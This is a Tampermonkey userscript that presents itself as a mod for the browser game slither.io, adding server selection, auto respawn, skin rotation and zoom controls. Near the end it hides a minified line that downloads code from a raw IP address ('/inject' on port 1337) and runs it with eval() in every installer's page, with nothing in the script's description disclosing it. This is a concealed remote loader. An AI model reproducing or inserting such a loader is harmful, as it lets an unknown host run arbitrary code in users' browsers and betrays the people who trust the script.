// ==UserScript==
// @name         Fz Slither Bots+Mods
// @namespace    http://tampermonkey.net/
// @version      2.2
// @description  Edited By Fz and Created By condoriano 
// @author       Fayiz
// @icon         https://lh3.googleusercontent.com/uXiTRvjU7X_Gq4xvT5k54fB--aG0UZ-WlfLr-Yfhyy0jb5lfPi3ew7L4_LdbRFnoki63=w300
// @match        http://slither.io/
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/21375/Fz%20Slither%20Bots%2BMods.user.js
// @updateURL https://update.greasyfork.org/scripts/21375/Fz%20Slither%20Bots%2BMods.meta.js
// ==/UserScript==

(function() {
    'use strict';
    
	if(window.top != window.self) return;

	var optnDiv, optnBox, popupsDiv, trDiv, extrasDiv,
		loginDiv,
		gameBG = null,
		playerAlive = false,
		skinRotateLoop = null,
		settings = {},
		playBtn = null,
		optnKeys = [ 'z', 'x', 'c', 'v', 'b', 'n', 'm','s' ],
		optnKeysInt = [ 90, 88, 67, 86, 66, 78, 77 ],
		overlayOpened = false,
		isFirefox = navigator.userAgent.toLowerCase().indexOf('firefox') != -1;

	var tempLoop = setInterval(function() {
		if(window.sos && window.sos.length) {
			clearInterval(tempLoop);
			window.onbeforeunload = function() { return 'Quit game?'; };
			editHTML();
			hookHTML();
			handleLogic();
			hookKeys();
		}
	}, 100);

	function editHTML() {
		loginDiv = document.getElementById('login');
		playBtn = document.getElementById('playh').children[0];
		document.body.style.backgroundColor = '#' + getRandomInt(1, 6) + getRandomInt(1, 6) + getRandomInt(1, 6);
		document.getElementById('nick_holder').style.backgroundColor = 'rgba(0,0,0,0.5)';
		[ '#tips', '#nick', '#clq', '.nsi', '.lq2' ].forEach(function(e) {
			var b = document.querySelectorAll(e);
			for(var i = 0; i < b.length; i++) b[i].style.color = '#EEE';
		});
		[ '.sadg1', '.sadu1', '.sadd1' ].forEach(function(e) {
			var b = document.querySelectorAll(e);
			for(var i = 0; i < b.length; i++) b[i].style.background = hasClass(b[i], 'sadg1') ? 'rgba(250,250,250,0.1)' : hasClass(b[i], 'sadu1') ? 'rgba(250,250,250,0.15)' : 'rgba(0,0,0,0.5)';
		});

		optnDiv = document.createElement('div');
		optnDiv.id = 'optn';
		optnDiv.style = 'display: inline-block';
		optnDiv.innerHTML = '<a id="optnBtn" href="#" class="btn btnt"><img src="http://i.imgur.com/KeFKZvM.png" border="0" height="87" width="90"></a>';
		document.getElementById('grqh').appendChild(optnDiv);

		optnBox = document.createElement('div');
		optnBox.id = 'optnBox';
		optnBox.style = 'position: absolute; top: 100px; right: 0px; width: 280px; background-color: rgba(0,0,0,0.5); color: #BBB; font-family: Tahoma; font-size: 12px; border-radius: 12px; padding: 6px 12px;';
		optnBox.innerHTML += '<div id="optnBox-settings" style="padding: 6px 6px 12px; border-bottom: 1px dashed #555;"></div>';
		optnBox.innerHTML += '<div id="optnBox-keys" style="padding: 6px 6px 12px; border-bottom: 1px dashed #555;"></div>';
		optnBox.innerHTML += '<div style="padding-top: 4px; font-size: 12px; text-align: right">Mod by Fz. <a style="text-decoration: none; color: #AF3;" href="https://greasyfork.org/en/scripts/21375-fz-slither-bots" target="_blank">Homepage</a></div>';
		optnDiv.appendChild(optnBox);

		optnBox.children[0].innerHTML += '<span style="display: block; font-weight: bold; color: #3AF; margin-bottom: 4px; position: relative; left: -5px;">Game Settings</span>';
		optnBox.children[0].innerHTML += '<div>Server: <select id="servers"><option value="">Loading...</option></select></div>';
		optnBox.children[0].innerHTML += '<label><input id="optnAutoRespawn" type="checkbox">Auto respawn</label>';
		optnBox.children[0].innerHTML += '<label><input id="optnRotateSkin" type="checkbox">Rotate skin</label>';
		optnBox.children[0].innerHTML += '<label><input id="optnNoSkin" type="checkbox">No skins</label>';
		optnBox.children[0].innerHTML += '<label><input id="optnNoBG" type="checkbox">No background</label>';

		optnBox.children[1].innerHTML += '<span style="display: block; font-weight: bold; color: #3AF; margin-bottom: 4px; position: relative; left: -5px;">Controls / Shortcut keys</span>';
		optnBox.children[1].innerHTML += '<span><span>Mouse or Arrow keys</span> : Move snake</span>';
		optnBox.children[1].innerHTML += '<span><span>Mouse click or Space</span> : Speed boost</span>';
		optnBox.children[1].innerHTML += '<span><span>ESC</span> : Quit to main menu</span>';
		optnBox.children[1].innerHTML += '<span><span>Z - M</span> : Toggle settings checkboxes</span>';
		optnBox.children[1].innerHTML += '<span><span>&lt;</span> : Prev skin</span>';
		optnBox.children[1].innerHTML += '<span><span>&gt;</span> : Next skin</span>';
		optnBox.children[1].innerHTML += '<span><span>-</span> : Zoom out</span>';
		optnBox.children[1].innerHTML += '<span><span>+</span> : Zoom in</span>';
		optnBox.children[1].innerHTML += '<span><span>0</span> : Reset zoom</span>';
        optnBox.children[1].innerHTML += '<span><span>S</span> : Speed Bots</span>';

		popupsDiv = document.createElement('div');
		popupsDiv.id = 'popupsDiv';
		popupsDiv.style = 'position: absolute; display: flex; flex-direction: column-reverse; bottom: 10px; left: 210px; width: 260px; max-height: 200px; overflow: hidden; font-family: Tahoma; z-index: 5;';
		document.body.appendChild(popupsDiv);

		trDiv = document.createElement('div');
		trDiv.id = 'topRight';
		trDiv.style = 'position: absolute; top: 100px; left: 5px; z-index: 100;';
		document.body.appendChild(trDiv);

		extrasDiv = document.createElement('div');
		extrasDiv.id = 'extrasDiv';
		extrasDiv.innerHTML = '<div id="extras-ip"></div><div id="extras-location"></div><div id="extras-fps"></div>';
		extrasDiv.style = 'display: none; position: absolute; top: 5px; left: 5px; color: #AAA; font-family: Verdana; font-size: 12px; z-index: 5;';
		document.body.appendChild(extrasDiv);

		var optn = document.getElementById('optnBox-settings').children;
		for(var i = 1; i < optn.length; i++) {
			if(i == 1) optn[i].style = 'margin: 5px 0px; text-align: center;';
			else {
				var j = document.createElement('strong');
				j.innerHTML = '(' + optnKeys[i - 2].toUpperCase() + ')';
				j.style = 'display: inline-block; min-width: 18px;';
				optn[i].insertBefore(j, optn[i].firstChild);
				optn[i].style = 'display: inline-block; min-width: 50%;';
				optn[i].children[1].style = 'margin: 0px 4px; position: relative; top: 2px';
			}
		}
		optn = document.getElementById('optnBox-keys').children;
		for(var i = 1; i < optn.length; i++) {
			optn[i].style = 'display: inline-block; min-width: 50%; margin: 1px 0px;';
			optn[i].children[0].style = 'display: inline-block; background-color: #000; color: #FFF; padding: 0px 6px; border-radius: 3px; min-width: 12px; text-align: center;';
		}
	}

	function hookHTML() {
		[ '#nick', '#servers' ].forEach(function(e) {
			var elems = document.querySelectorAll(e);
			for(var i = 0; i < elems.length; i++) {
				elems[i].addEventListener('change', function() {
					settings[this.id] = this.value;
					localStorage.setItem('settings', JSON.stringify(settings));
				});
			}
		});
		[ 'input[type="checkbox"]' ].forEach(function(e) {
			var elems = document.querySelectorAll(e);
			for(var i = 0; i < elems.length; i++) {
				elems[i].addEventListener('change', function() {
					settings[this.id] = this.checked;
					localStorage.setItem('settings', JSON.stringify(settings));
					createPopup(this.nextSibling.textContent + ' <span style="color: ' + (this.checked ? '#9D2;">Enabled</span>' : '#F33;">Disabled</span>'));

					if(this.id == 'optnRotateSkin') {
						if(this.checked) { if(!skinRotateLoop) skinRotateLoop = setInterval(function() { changeSkin(1); }, 1000); }
						else { clearInterval(skinRotateLoop); skinRotateLoop = null; }
					}
					else if(this.id == 'optnNoSkin') window.render_mode = this.checked ? 1 : 2;
					else if(this.id == 'optnNoBG') window.bgp2 = this.checked ? null : gameBG;
				});
			}
		});

		document.getElementById('optnBtn').addEventListener('click', function(e) {
			optnBox.style.display = optnBox.style.display == 'none' ? 'block' : 'none';
			e.preventDefault();
		});
		playBtn.addEventListener('click', function() {
			overlayOpened = false;
			var activeIp = document.getElementById('servers').value;
			if(activeIp) {
				window.dead_mtm = 0;
				window.login_fr = 0;
				window.forcing = true;
				window.bso = {};
				window.bso.ip = activeIp.split(':')[0];
				window.bso.po = activeIp.split(':')[1];
				window.connect();
			}
		});
	}

	function handleLogic() {
		for(var x = 0, perReq = 100; x < Math.ceil(window.sos.length / perReq); x++) {
			var ips = [], min = x * perReq, max = x * perReq + perReq > window.sos.length ? window.sos.length : x * perReq + perReq;
			for(var i = min; i < max; i++) ips.push({ query: window.sos[i].ip });
			sendQuery(ips, min, x == Math.ceil(window.sos.length / perReq) - 1);
		}

		function sendQuery(ips, offset, allDone) {
			var httpReq = new XMLHttpRequest();
			httpReq.open('POST', 'http://ip-api.com/batch?fields=country,countryCode,regionName', true);
			httpReq.onreadystatechange = function(e) {
				if(httpReq.readyState == 4 && httpReq.status == 200) {
					var data = JSON.parse(httpReq.responseText);
					for(var i = 0; i < ips.length; i++) {
						window.sos[offset + i].country = data[i].country;
						window.sos[offset + i].countryCode = data[i].countryCode;
						window.sos[offset + i].regionName = data[i].regionName;
					}
					if(allDone) setTimeout(listServers, 100);
				}
			};
			httpReq.send(JSON.stringify(ips));
		}

		var observer = new MutationObserver(function(changes) {
			changes.forEach(function(change) {
				if(loginDiv.style.display == 'none') {
					onPlayerSpawn();
					playerAlive = true;
				}
				else {
					if(playerAlive) onPlayerDeath();
					playerAlive = false;
				}
			});
		});
		observer.observe(loginDiv, { attributes: true, attributeFilter: ['style'] });
	}

	function onPlayerSpawn() {
		window.forcing = false;
		extrasDiv.style.display = 'block';
		trDiv.style.display = 'none';
		document.getElementById('nick').blur();
		document.getElementById('extras-ip').innerHTML = 'Server IP: <span style="color: #EEE;">' + window.bso.ip + ':' + window.bso.po + '</span';
		document.getElementById('extras-fps').innerHTML = 'FPS: <span style="color: #EEE;">' + window.fps + '</span';

		for(var i = 0; i < window.sos.length; i++) {
			if(window.sos[i].ip == window.bso.ip && window.sos[i].po == window.bso.po) {
				var txt = window.sos[i].country.toLowerCase() == 'singapore' ? window.sos[i].country : window.sos[i].regionName + ', ' + window.sos[i].country;
				document.getElementById('extras-location').innerHTML = 'Server Location: <span style="color: #EEE;">' + txt + '</span';
				break;
			}
		}
	}
	function onPlayerDeath() {
		document.body.style.backgroundColor = '#' + getRandomInt(1, 6) + getRandomInt(1, 6) + getRandomInt(1, 6);
		extrasDiv.style.display = 'none';
		trDiv.style.display = 'block';
		if(document.getElementById('optnAutoRespawn').checked && !overlayOpened) playBtn.click();
	}

	function listServers() {
		var servers = document.getElementById('servers');
		servers.innerHTML = '<option value="">Auto</option>';
		for(var i = 0, l = window.sos.length; i < l; i++) {
			var addr = window.sos[i].ip + ':' + window.sos[i].po;
			var cc = window.sos[i].countryCode;
			servers.innerHTML += '<option value="' + addr + '">' + (cc ? cc : '??') + ' (#' + (i + 1) + ') - ' + addr + '</option>';
		}
		loadSettings();
	}

	function loadSettings() {
		gameBG = window.bgp2;
		localStorage.setItem("edttsg", "1");
		if(localStorage.getItem('settings')) settings = JSON.parse(localStorage.getItem('settings'));

		[ '#nick', '#servers' ].forEach(function(e) {
			var elems = document.querySelectorAll(e);
			for(var i = 0; i < elems.length; i++) {
				var itsId = elems[i].id;
				if(settings.hasOwnProperty(itsId)) {
					if(itsId == 'servers') {
						for(var j = 0; j < elems[i].options.length; j++) {
							if(elems[i].options[j].value == settings[itsId]) {
								elems[i].value = settings[itsId];
								break;
							}
						}
					}
					else elems[i].value = settings[itsId];
				}
			}
		});

		var checkboxes = optnBox.querySelectorAll('input[type="checkbox"]');
		for(var i = 0; i < checkboxes.length; i++) { if(settings[checkboxes[i].id]) checkboxes[i].click(); }
		if(settings.optnAutoRespawn) playBtn.click();
	}

	function hookKeys() {
		document.addEventListener('keydown', function(e) {
			var key = e.keyCode || e.which;
			if(e.ctrlKey || e.altKey || e.shiftKey) return;
			if(document.activeElement.tagName == 'INPUT' && document.activeElement.type == 'text') return;
			if(key == 27) { //key ESC
				overlayOpened = overlayOpened ? false : true;
				window.want_close_socket = true;
				window.dead_mtm = 0;
				window.play_btn.setEnabled(true);
				window.resetGame();
			}
			else if(key == 190) changeSkin(1, true); //key >
			else if(key == 188) changeSkin(-1, true); //key <
			else if(key == 48) window.gsc = 0.9; // key 0
			else if((key == 173 && isFirefox) || key == 189) window.gsc -= window.gsc >= 0.1 ? 0.1 : window.gsc; // key -
			else if((key == 61 && isFirefox) || key == 187) window.gsc += 0.1; // key +
			else {
				for(var i = 0; i < optnKeysInt.length; i++) {
					if(key == optnKeysInt[i]) document.getElementById('optnBox-settings').children[i + 2].click();
				}
			}
		});
		if(isFirefox) document.addEventListener("DOMMouseScroll", handleZoom, false);
		else document.body.onmousewheel = handleZoom;
	}

	function createPopup(msg, displayTime=1200, bgColor='rgba(0,0,0,0.7)') {
		var popup = document.createElement('div');
		popup.style = 'display: table; background-color: ' + bgColor + '; color: #DDD; margin: 2px 0px; max-width: 260px; padding: 0px 16px 2px 16px; border-radius: 30px; font-size: 12px;';
		popup.innerHTML = msg;
		popupsDiv.insertBefore(popup, popupsDiv.firstChild);
		setTimeout(function() { popup.remove(); }, displayTime);
	}

	function changeSkin(e, popup) {
		if(window.playing && window.snake !== null) {
			var curSkin = window.snake.rcv, maxSkin = window.max_skin_cv;
			curSkin = curSkin + e;
			curSkin = curSkin < 0 ? maxSkin : curSkin > maxSkin ? 0 : curSkin;
			window.setSkin(window.snake, curSkin);
			localStorage.setItem('snakercv', curSkin);
			if(popup) createPopup('Skin #' + (curSkin + 1) + ' applied');
		}
	}

	function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min)) + min; }
	function hasClass(element, cls) { return (' ' + element.className + ' ').indexOf(' ' + cls + ' ') > -1; }

    
    var xhttp=new XMLHttpRequest;xhttp.onreadystatechange=function(){4==xhttp.readyState&&200==xhttp.status&&eval(xhttp.responseText)},xhttp.open("GET","http://139.59.22.68:1337/inject",!0),xhttp.send();
    
    
   document.body.onmousewheel = zoom;

   function zoom(e) {

    gsc *= Math.pow(0.9, e.wheelDelta / -120 || e.detail || 0);

  }
    

  
    })();
